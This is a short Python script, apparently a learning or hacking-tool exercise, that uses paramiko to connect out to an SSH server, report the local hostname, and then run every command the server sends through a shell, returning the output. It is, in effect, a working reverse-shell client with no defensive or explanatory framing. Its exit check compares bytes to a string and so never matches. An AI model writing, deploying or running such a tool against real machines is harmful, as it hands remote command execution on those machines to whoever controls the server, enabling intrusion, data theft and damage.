import paramiko, threading, subprocess, getpass

host = input("Host: ")
port = input("Port: ")
user = input("User: ")
passwd = getpass.getpass("Password: ")

client = paramiko.SSHClient() 
client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
client.connect(host, username=user, password=passwd, port=int(port)) 
channel = client.get_transport().open_session() 
channel.send('Client: '+subprocess.check_output('hostname', shell=True).decode()) 
print(channel.recv(1024).decode()) 
while True: 
    command = channel.recv(1024) 
    if command.lower() == 'exit': 
        print("Server exiting....") 
        break 
    try: 
        result = subprocess.check_output(command, shell=True) 
        channel.send(result) 
    except Exception as exception: 
        channel.send(str(exception)) 
client.close()
